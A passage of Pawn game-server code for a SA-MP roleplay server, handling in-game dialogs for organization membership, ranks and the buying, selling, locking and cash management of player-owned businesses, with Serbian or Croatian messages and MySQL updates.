		format(q, sizeof(q), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", ID, org_info[ ID ][ oDilerCena ], org_info[ ID ][ oSafeDrugAmmount ], ((org_info[ID][oDilerRadi]) ? ("Da") : ("Ne")) );
		UpdateDynamic3DTextLabelText(org_info[ID][oDiler3D], 0x64BC47FF, q);
	}
	else if(dialogid == dialog_ORGBIZZSELL )
	{
	    if( response )
		{
	        new id = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ];
   	 		if( org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ] == -1 ) return SendErrorMessage( playerid, "Vasa organizacija ne poseduje firmu!");
            if( GetNearestBussines( playerid ) != id ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");

			WriteLog("log-sell", "Igrac %s je prodao org firmu ID %d na buy", ImeIgraca( playerid ), id);

            org_info[ PlayerInfo[ playerid ][ xLider ] ][ oEntFromBussines ] = -1;
            org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ] = -1;

			DajIgracuNovac( playerid, BusinessInfo[ id ][ bPrice ]/2 );
			BusinessInfo[ id ][ bLocked ] = 0;
			BusinessInfo[ id ][ bNeaktivnost ] = 0;
			BusinessInfo[ id ][ bFacture ] = 100;
			BusinessInfo[ id ][ bOwnerOrg ] = -1;
			BusinessInfo[ id ][ bOwner_sqlID ] = -1;
			BusinessInfo[ id ][ bOnAuction ] = false;
			strmid( BusinessInfo[ id ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
			Bussines_Refresh( id );

			new q[ 200 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '0', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
					BusinessInfo[ id ][ bOwner_sqlID ], BusinessInfo[ id ][ bNeaktivnost ], BusinessInfo[ id ][ bFacture ], BusinessInfo[ id ][ b_ID ] );

			mysql_tquery( mSQL, q);

            sql_organization_update_integer( PlayerInfo[ playerid ][ xLider ], "owned_business", 0 );

    		SendInfoMessage( playerid, "Organizacijska firma uspesno prodana." );
		}
		if( !response )
		{
		    SendInfoMessage(playerid, "Odustali ste od prodaje firme drzavi." );
		}
	}
	else if(dialogid == dialog_OFLOCK )
	{
        new id = GetNearestBussines( playerid );
        if( id != org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ] ) return SendErrorMessage( playerid, "Ovo nije firma tvoje orge");
  		if( response )
 		{
            BusinessInfo[ id ][ bLocked ] = 0;
        	GameTextForPlayer( playerid, "~w~Firma ~g~otkljucana!", 3000, 3 );
        	sql_bussines_update_integer( id, "b_locked", BusinessInfo[ id ][ bLocked ] );
		}
		else
		{
		    BusinessInfo[ id ][ bLocked ] = 1;
        	GameTextForPlayer( playerid, "~w~waFirma ~r~zakljucana!", 3000, 3 );
        	sql_bussines_update_integer( id, "b_locked", BusinessInfo[ id ][ bLocked ] );
		}
	}
	else if(dialogid == dialog_OFCNAME && response )
	{
	    new IDFirme = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ], imefirme[64];
        if( IDFirme == -1 ) return SendErrorMessage( playerid, "Vasa organizacija ne poseduje firmu!");
        if( sscanf( inputtext, "s[64]", imefirme ) ) return ShowPlayerDialog( playerid, dialog_FCNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete novo ime koje zelite.", "Potvrdi", "Odustani" );

		strmid( BusinessInfo[ IDFirme ][ bName ], imefirme, 0, strlen( imefirme ), 64);
		sql_bussines_update_string( IDFirme, "b_name", BusinessInfo[ IDFirme ][ bName ] );
		Bussines_Refresh( IDFirme );
		SendInfoMessage( playerid, "Uspesno si promenio ime firme." );
	}
	else if(dialogid == dialog_OFOMONEY )
	{
		if( !response ) return 1;
		if( response )
		{
			new iznos, IDFirme = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ];
			if( sscanf(inputtext, "i", iznos)) return SendErrorMessage( playerid, "Niste uneli kolicinu novca za ostavljanje!");
			if( iznos < 1 || iznos > 10000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 10000!");
            if( iznos > PlayerInfo[ playerid  ][ xNovac ] ) return SendErrorMessage( playerid, "Nemate toliko novca kod sebe!");

			DajIgracuNovac( playerid, -iznos );
			BusinessInfo[ IDFirme ][ bMoney ] += iznos;
			SendInfoMessage( playerid, "Ostavili ste {FFFFFF}($%d) {4282C0}u kasu firme.", iznos );
		    sql_bussines_update_integer( IDFirme, "b_money", BusinessInfo[ IDFirme ][ bMoney ] );
		}
	}
	else if(dialogid == dialog_OFPMONEY )
	{
		if( !response ) return 1;
		if( response )
		{
			new iznos, IDFirme = org_info[ PlayerInfo[ playerid ][ xLider ] ][ oBussinesID ];
			if( sscanf(inputtext, "i", iznos)) return SendErrorMessage( playerid, "Niste uneli kolicinu novca za ostavljanje!");
			if( iznos < 1 || iznos > 10000) return SendErrorMessage( playerid, "Kolicina novca ne moze biti ispod 1 i iznad 10000!");
            if( iznos > BusinessInfo[ IDFirme ][ bMoney ] ) return SendErrorMessage( playerid, "Nemate toliko novca u kasi!");

			DajIgracuNovac( playerid, iznos ); BusinessInfo[ IDFirme ][ bMoney ] -= iznos;
			SendInfoMessage( playerid, "Podigli ste {FFFFFF}($%d) {FFFFFF}iz kase firme!", iznos );
		    sql_bussines_update_integer( IDFirme, "b_money", BusinessInfo[ IDFirme ][ bMoney ] );
		}
	}
	else if(dialogid == dialog_UBACIUORG && response )
	{
	    new igrac;
	    if( sscanf( inputtext, "u", igrac ) ) return SendErrorMessage( playerid, "Nepravilan ID!" );
	 	if( igrac == IPI ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
	 	if( PlayerInfo[ igrac ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
	 	if( PlayerInfo[ igrac ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
		if( PlayerInfo[ igrac ][ xLevel ] < 1 ) return SendErrorMessage( playerid, "Za ulaz u organizacuju potreban je level 1." );
		if( PlayerInfo[ igrac ][ xKazneniUgovor ] != 0 ) return SendErrorMessage( playerid, "Igrac ima kazneni ugovor napustanja organizacije!");
		if( PlayerInfo[ igrac ][ xAdmin ] != 0) return SendErrorMessage( playerid, "Igrac je clan staff teama servera (Admin)!");
		if( PlayerInfo[ igrac ][ xSpecAdmin ] != 0) return SendErrorMessage( playerid, "Igrac je clan staff teama servera (Spec Admin)!");
		if( PlayerInfo[ igrac ][ xGamemaster ] != 0) return SendErrorMessage( playerid, "Igrac je clan staff teama servera (Gamemaster)!");

		new OrgID = PlayerInfo[ playerid ][ xLider ];
		if( org_info[ OrgID ][ oUbacenihClanova ] >= org_info[ OrgID ][ oMaxClanova ] ) return SendErrorMessage( playerid, "Vec imas ubacenih maksimalnih %d clanova.", org_info[ OrgID ][ oMaxClanova ] );
        if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

	    PonudioIgrac[ igrac ] = playerid;

	    new string[ 220+MAX_PLAYER_NAME ];
	    format( string, sizeof( string ), "{FFFFFF}* Lider %s vas je pozvao u svoju orgu %s.\n\nDa prihvatis pretisni na 'Prihvati'.\nDa odustanes pritisni na 'Odustani'.", ImeIgraca( playerid ), getOrgName( OrgID ) );

	    ShowPlayerDialog( igrac, dialog_UBACIUORG_2, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "Potvrdi", "Odustani" );
	}
	else if(dialogid == dialog_UBACIUORG_2 )
	{
	    if( response )
		{
		    new igrac = PonudioIgrac[ playerid ];

			new OrgID = PlayerInfo[ igrac ][ xLider ], slot_id = -1;

		    if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

			for( new i = 0; i < org_info[ OrgID ][ oMaxClanova ]+2; i++ )
			{
				if( strcmp( "Niko", org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
				{
					slot_id = i;
					break;
				}
			}
            if( slot_id == -1 ) return SendErrorMessage( playerid, "Ova organizacija ima maksimalni broj clanova!" );

            strmid( org_members_info[ OrgID ][ slot_id ][ o_m_Name ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME  );
			org_members_info[ OrgID ][ slot_id ][ o_m_sqlID ] = PlayerInfo[ playerid ][ xID ];
			org_members_info[ OrgID ][ slot_id ][ o_m_type ] = 0;


            org_info[ OrgID ][ oUbacenihClanova ]++;

			PlayerInfo[ playerid ][ xClan ] = OrgID;
			PlayerInfo[ playerid ][ xRank ] = 1;
			PlayerInfo[ playerid ][ xSpawn ] = SPAWN_BAZA;

			sql_org_member_inser( org_info[ OrgID ][ oID ], 0, playerid );

		    if( PlayerInfo[ playerid ][ xPol ] == 1 )
			{
				PlayerInfo[ playerid ][ xSkin ] = org_info[ OrgID ][ oSkin1 ];
				SMG_SetPlayerSkin( playerid, org_info[ OrgID ][ oSkin1 ] );
			}
			else if( PlayerInfo[ igrac ][ xPol ] == 2 )
			{
				PlayerInfo[ playerid ][ xSkin ] = org_info[ OrgID ][ oZSkin1 ];
				SMG_SetPlayerSkin( playerid, org_info[ OrgID ][ oZSkin1 ] );
			}

			PlayerInfo[ playerid ][ xOrgUgovor ] = 0;
			sql_user_update_org_variables( playerid );
		    SendInfoMessage( playerid, "Cestitamo, usli ste u organizaciju {FFFFFF}%s.", getOrgName( OrgID ) );
		    SendInfoMessage( igrac, "Igrac {FFFFFF}%s {4282C0}je prihvatio poziv u vasu organizaciju", ImeIgraca( playerid ) );

		    if(questInfo[playerid][qt_EasyQuest][8] == false)
		    {
		    	questInfo[playerid][qt_EasyQuest][8] = true;
		    	sql_UpdateQuest(playerid);

				KillTimer(QuestTimer[playerid]);
				quest_CreateTDs(playerid, false);

				quest_CreateTDs(playerid, true);
				PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.9");
				PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

				QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
		    }
		    PonudioIgrac[ playerid ] = -1;
		}
		else if( !response )
		{
		    new igrac = PonudioIgrac[ igrac ];

		    if( igrac != -1 )
			{
		        SendInfoMessage( igrac, "Igrac {FFFFFF}%s {4282C0}je odbio poziv u vasu organizaciju", ImeIgraca( playerid ) );
		    }

		    SendInfoMessage( playerid, "Odbili ste poziv za ulazak u organizaciju." );
		    PonudioIgrac[ playerid ] = -1;
		}
	}
	else if(dialogid == dialog_OFFIZBACIIZORG && response )
	{
	    new imeigraca[ 24 ], OrgID = PlayerInfo[ playerid ][ xLider ];
	    if( sscanf( inputtext, "s[24]", imeigraca ) ) return SendErrorMessage( playerid, "Nepravilno uneto ime i prezime(Ime_Prezime)." );

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) )
		{
			SendErrorMessage( playerid, "Taj igrac je online tako da skini ga online.");
			return 1;
		}

		new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffOrgKick", "iiis", 0, OrgID, playerid, imeigraca );
	}
	else if(dialogid == dialog_IZBACIIZORG && response )
	{
	    new igrac, OrgID = PlayerInfo[ playerid ][ xLider ];
	    if( sscanf( inputtext, "u", igrac ) ) return SendErrorMessage( playerid, "Nepravilan ID!" );
	 	if( igrac == IPI ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
		if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe." );
	 	if( PlayerInfo[ igrac ][ xClan ] != OrgID ) return SendErrorMessage( playerid, "Igrac nije clan vase organizacije!" );
        if( PlayerInfo[ igrac ][ xLider ] > 0  ) return SendErrorMessage( playerid, "Ne mozes to lideru." );

		new name[ MAX_PLAYER_NAME ];
		format( name, sizeof( name ), "%s", ImeIgraca( igrac ) );

	    if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

		for( new i = 0; i < 52; i++ )
		{
			if( strcmp( name, org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
			{
			    strmid( org_members_info[ OrgID ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
			    org_members_info[ OrgID ][ i ][ o_m_sqlID ] = 0;
			    break;
			}
		}

	    SCMF( igrac, CRVENA, "(ORGANIZACIJA): Izbaceni ste iz organizacije {FFFFFF}%s.", getOrgName( OrgID ) );
	    SCMF( playerid, CRVENA, "(ORGANIZACIJA): Izbacili ste igraca {FFFFFF}%s {FF0000}iz vase organizacije.", ImeIgraca( igrac ) );

		if( PlayerInfo[ igrac ][ xOrgUgovor ] < 10 )
		{
		    SendClientMessage( igrac, CRVENA, "(ORGANIZACIJA): Niste bili 10 sati u organizaciji i dobili ste 10 sati zabranu ulaska u org." );
			PlayerInfo[ igrac ][ xKazneniUgovor ] = 10;
		}

		sql_org_member_delete( org_info[ OrgID ][ oID ], PlayerInfo[ igrac ][ xID ] );
        org_info[ OrgID ][ oUbacenihClanova ]--;

		ResetPlayerWeapons( igrac );
		PlayerInfo[ igrac ][ xClan ] = 0;
		PlayerInfo[ igrac ][ xRank ] = 0;
		PlayerInfo[ igrac ][ xSpawn ] = SetRandomSpawn( igrac );
        PlayerInfo[ igrac ][ xOrgUgovor ] = 0;
		PlayerInfo[ igrac ][ xSkin ] = SetSexSkin( igrac );
		SMG_SetPlayerSkin( igrac, SetSexSkin( igrac ) );

        sql_user_update_org_variables( igrac );
	}
	else if(dialogid == dialog_KAZNIIGRACA && response )
	{
	    new igrac, OrgID = PlayerInfo[ playerid ][ xLider ];
	    if( sscanf( inputtext, "u", igrac ) ) return SendErrorMessage( playerid, "Nepravilan ID!" );
	 	if( igrac == IPI ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
		if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe." );
	 	if( PlayerInfo[ igrac ][ xClan ] != OrgID ) return SendErrorMessage( playerid, "Igrac nije clan vase organizacije!" );
        if( PlayerInfo[ igrac ][ xLider ] > 0  ) return SendErrorMessage( playerid, "Ne mozes to lideru." );
		new name[ MAX_PLAYER_NAME ];
		format( name, sizeof( name ), "%s", ImeIgraca( igrac ) );
	    if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Ta organizacija ne postoji u bazi podataka." );

		for( new i = 0; i < 52; i++ )
		{
			if( strcmp( name, org_members_info[ OrgID ][ i ][ o_m_Name ], true ) == 0 )
			{
			    strmid( org_members_info[ OrgID ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
			    org_members_info[ OrgID ][ i ][ o_m_sqlID ] = 0;
			    break;
			}
		}

	    SCMF( igrac, CRVENA, "(ORGANIZACIJA): Izbacen si iz organizacije {FFFFFF}%s.", getOrgName( OrgID ) );
	    SCMF( playerid, CRVENA, "(ORGANIZACIJA): Izbacili ste igraca {FFFFFF}%s {4282C0}iz vase organizacije.", ImeIgraca( igrac ) );


	 	SendClientMessage( igrac, CRVENA, "(ORGANIZACIJA): LIDER VAS JE KAZNIO SA 10 SATI ZABRANE ULASKA U ORG I 50.000$" );
		PlayerInfo[ igrac ][ xKazneniUgovor ] = 10;
		DajIgracuNovac( igrac, -50000 );

		sql_org_member_delete( org_info[ OrgID ][ oID ], PlayerInfo[ igrac ][ xID ] );
        org_info[ OrgID ][ oUbacenihClanova ]--;

		ResetPlayerWeapons( igrac );
		PlayerInfo[ igrac ][ xClan ] = 0;
		PlayerInfo[ igrac ][ xRank ] = 0;
		PlayerInfo[ igrac ][ xSpawn ] = SetRandomSpawn( igrac );
        PlayerInfo[ igrac ][ xOrgUgovor ] = 0;
		PlayerInfo[ igrac ][ xSkin ] = SetSexSkin( igrac );
		SMG_SetPlayerSkin( igrac, SetSexSkin( igrac ) );

        sql_user_update_org_variables( igrac );
	}
	else if(dialogid == dialog_DODELIRANK && response )
	{
	    new clan, OrgID = PlayerInfo[ playerid ][ xLider ], rank;
	    if( sscanf( inputtext, "ui", clan, rank ) ) return ShowPlayerDialog( playerid, dialog_DODELIRANK, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id igraca i broj ranka koji zelite da date igracu:", "Potvrdi", "Odustani");
		if( clan == IPI ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
		if( clan == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi." );
		if( PlayerInfo[ clan ][ xClan ] != OrgID ) return SendErrorMessage( playerid, "Igrac nije clan vase organizacije!" );
		if( PlayerInfo[ clan ][ xLider ] == OrgID ) return SendErrorMessage( playerid, "Ne mozes drugom lideru skinuti rank." );
	    if( PlayerInfo[ clan ][ xLider ] > 0  ) return SendErrorMessage( playerid, "Ne mozes to lideru." );
		if( OrgID < 1 || org_info[ OrgID ][ oID ] == 0 ) return SendErrorMessage( playerid, "Tvoja organizacija ne postoji u bazi podataka." );
		if( rank < 1 || rank > 6 ) return SendErrorMessage( playerid, "Ne mozes veci rank od 6, a manji od 1!" );

		if( PlayerInfo[ clan ][ xPol ] == 1 )
		{
			if( rank == 1 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oSkin1 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oSkin1 ] ); }
			else if( rank == 2 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oSkin2 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oSkin2 ] ); }
		    else if( rank == 3 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oSkin3 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oSkin3 ] ); }
		    else if( rank == 4 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oSkin4 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oSkin4 ] ); }
		    else if( rank == 5 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oSkin5 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oSkin5 ] ); }
		    else if( rank == 6 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oSkin6 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oSkin6 ] ); }
		}
		else if( PlayerInfo[ clan ][ xPol ] == 2 )
		{
			if( rank == 1 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oZSkin1 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oZSkin1 ] ); }
			else if( rank == 2 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oZSkin2 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oZSkin2 ] ); }
		    else if( rank == 3 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oZSkin3 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oZSkin3 ] ); }
		    else if( rank == 4 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oZSkin4 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oZSkin4 ] ); }
		    else if( rank == 5 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oZSkin5 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oZSkin5 ] ); }
		    else if( rank == 6 ) { PlayerInfo[ clan ][ xSkin ] = org_info[ OrgID ][ oZSkin6 ]; SMG_SetPlayerSkin( clan, org_info[ OrgID ][ oZSkin6 ] ); }
		}

		PlayerInfo[ clan ][ xRank ] = rank;

		new q[ 128 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `org_members` SET `memb_rank` = '%d' WHERE `memb_sqlID` = '%d' LIMIT 1", PlayerInfo[ clan ][ xRank ], PlayerInfo[ clan ][ xID ] );
	   	mysql_tquery( mSQL, q );

	    sql_user_update_integer( clan, "skin_id", PlayerInfo[ clan ][ xSkin ] );

		SendInfoMessage( clan, "Lider te unapredio na rank {FFFFFF}'%d'.", rank );
		SendInfoMessage( playerid, "Unapredili ste igraca {FFFFFF}%s {4282C0}na rank {FFFFFF}'%d'.", ImeIgraca( clan ), rank );
	}
	else if(dialogid == dialog_FIRMA && response )
	{
	    switch(listitem)
	    {
		    case 0:
			{
				new string[80], id = PlayerInfo[ playerid ][ xFirmaID ];
				format(string, sizeof(string), "Ime Firme: %s\nNovac: $%s\nFakture: %s", BusinessInfo[id][bName], fNumber(BusinessInfo[id][bMoney]), fNumber(BusinessInfo[id][bFacture]));
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );
			}
	        case 1:
			{
				ShowPlayerDialog( playerid, dialog_FCNAME, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete novo ime koje zelite:", "Potvrdi", "Odustani" );
			}
			case 2:
			{
	            ShowPlayerDialog( playerid, dialog_FLOCK, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Molimo vas da odaberete da li zelite da...", "Otkljucate", "Zakljucate" );
			}
			case 3:
			{
			    if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
	  			ShowPlayerDialog( playerid, dialog_FPMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete koliko zelite novca da podignete:\n\nMax 10,000,000$ odjednom", "Podigni", "Odustani" );
	  		}
			case 4:
			{
	  			if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
				ShowPlayerDialog( playerid, dialog_FOMONEY, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Molimo vas da unesete koliko zelite novca da ostavite:\n\nMax 10,000,000$ odjednom", "Ostavi", "Odustani" );
			}
			case 5:
   			{
	   	 		if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujes firmu!");
	            if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
	            if(GlobalImovinaIgracu[playerid] != false) return SendErrorMessage(playerid, "Ne mozes prodati firmu dok je u procesu prodaja igracu!");
				ShowPlayerDialog( playerid, dialog_FIRMASELLDRZAVA, DIALOG_STYLE_MSGBOX, D_NASLOV, "{FFFFFF}* Da li ste sigurni da zelite prodati vasu firmu drzavi?", "Da", "Ne" );
			}
			case 6:
			{
			    if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
				ShowPlayerDialog( playerid, dialog_FIRMASELLTP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ID igraca i cenu firme:", "Ponudi", "Odustani" );
			}
			case 7:
			{
			    new id = PlayerInfo[ playerid ][ xFirmaID ];
			    if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
				if( KupljeneFakture[ playerid ] < 1 ) return SendErrorMessage( playerid, "Niste kupili fakture." );

	            BusinessInfo[ id ][ bFacture ] += KupljeneFakture[ playerid ];

	            sql_bussines_update_integer( id, "b_facture", BusinessInfo[ id ][ bFacture ] );
	    		SendInfoMessage( playerid, "Uspesno si ubacio %s faktura u biznis, trenutno imas {FFFFFF}(%s).", fNumber(KupljeneFakture[ playerid ]), fNumber(BusinessInfo[ id ][ bFacture ]) );
	    		Bussines_Refresh( id );

				KupljeneFakture[ playerid ] = 0;
			}
		}
	}
	else if(dialogid == dialog_FIRMASELLDRZAVA )
	{
	    if( response )
		{
	        new id = PlayerInfo[ playerid ][ xFirmaID ];
   	 		if( PlayerInfo[ playerid ][ xFirmaID ] == -1 ) return SendErrorMessage( playerid, "Ne posedujes firmu!");
            if( GetNearestBussines( playerid ) != PlayerInfo[ playerid ][ xFirmaID ] ) return SendErrorMessage( playerid, "Niste blizu ulaza firme!");
			if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas firmu dok ne izadjes iz minusa u banci." );

			WriteLog("log-sell", "Igrac %s je prodao org firmu ID %d na buy", ImeIgraca( playerid ), id);

			BusinessInfo[ id ][ bOwner_sqlID ] = -1;
			BusinessInfo[ id ][ bOnAuction ] = false;
			BusinessInfo[ id ][ bNeaktivnost ] = 0;
			BusinessInfo[ id ][ bFacture ] = 100;
    		strmid( BusinessInfo[ id ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
    		BusinessInfo[ id ][ bLocked ] = 1;
    		DajIgracuNovac( playerid, BusinessInfo[ id ][ bPrice ]/2 );
    		PlayerInfo[ playerid ][ xFirmaID ] = -1;
    		PlayerInfo[ playerid ][ xBussinesSqlID ] = 0;

    		new q[ 200 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '0', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
					BusinessInfo[ id ][ bOwner_sqlID ],
					BusinessInfo[ id ][ bOwner ],
					BusinessInfo[ id ][ bNeaktivnost ],
					BusinessInfo[ id ][ bFacture ], BusinessInfo[ id ][ b_ID ] );

		   	mysql_tquery( mSQL, q );

    		SendInfoMessage( playerid, "Firma uspesno prodana." );
    		Bussines_Refresh( id );

    		sql_user_update_integer( playerid, "bussines_id", PlayerInfo[ playerid ][ xBussinesSqlID ] );
		}
		if( !response )
		{
		    SendInfoMessage(playerid, "Odustali ste od prodaje firme drzavi." );
		}
	}
	else if(dialogid == dialog_FIRMASELLTP )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas firmu dok ne izadjes iz minusa u banci." );
	        new id = PlayerInfo[ playerid ][ xFirmaID ], idigraca, cena, string[ 128 ], Float:Pos[ 3 ];
	        if( sscanf( inputtext, "ui", idigraca, cena ) ) return ShowPlayerDialog( playerid, dialog_FIRMASELLTP, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ID igraca i cenu firme:", "Ponudi", "Odustani" );
            GetPlayerPos( idigraca, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
			if( !IsPlayerInRangeOfPoint( playerid, 3.0, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] ) ) return SendErrorMessage( playerid, "Igrac nije blizu vas");
			if( cena < 1 ) return SendErrorMessage( playerid, "Cena ne moze biti manja od 1$!");
			if( idigraca == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
			if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati firmu!");
			if( PlayerInfo[ idigraca ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Igrac vec ima firmu!");
            if( PlayerInfo[ idigraca ][ xLevel ] < BusinessInfo[ id ][ bLevel ] ) return SCMF( playerid, CRVENA, "(FIRMA): Igrac mora biti level %d+ da bi ste mu prodali firmu.", BusinessInfo[ id ][ bLevel ] );

			SCMF( playerid, 0x33CCFFFF, "(FIRMA): Ponudili ste igracu {FFFFFF}%s {33CCFF}firmu po ceni od %d.", ImeIgraca( idigraca ), cena );
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
			GlobalImovinaIgracu[playerid] = true;
			format( string, sizeof( string ), "{FFFFFF}* Igrac %s vam je ponudio da kupite njegovu firmu za %d:", ImeIgraca( playerid ), cena );
			ShowPlayerDialog( idigraca, dialog_ACCEPTFRIMA, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "Prihvati", "Odbij" );
	    }
	}
	else if(dialogid == dialog_ACCEPTFRIMA )
	{
	    if( response )
		{
	        new id = PlayerInfo[ GlobalProdaja[ playerid ] ][ xFirmaID ];
	        if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca.");

			WriteLog("log-sell", "Igrac %s je prodao firmu ID %d igracu %s za %d", ImeIgraca( GlobalProdaja[ playerid ] ), id, ImeIgraca( playerid ), GlobalCena[ playerid ]);
			SCMF( playerid, 0x33CCFFFF, "(FIRMA): Uspesno ste kupili firmu od igraca {FFFFFF}%s {33CCFF}za {FFFFFF}($%d).", ImeIgraca( GlobalProdaja[ playerid ] ), GlobalCena[ playerid ] );

			PlayerInfo[ GlobalProdaja[ playerid ] ][ xFirmaID ] = -1;
			PlayerInfo[ GlobalProdaja[ playerid ] ][ xBussinesSqlID ] = 0;
			PlayerInfo[ playerid ][ xFirmaID ] = id;
			PlayerInfo[ playerid ][ xBussinesSqlID ] = BusinessInfo[ id ][ b_ID ];
			BusinessInfo[ id ][ bOwner_sqlID ] = PlayerInfo[ playerid ][ xID ];
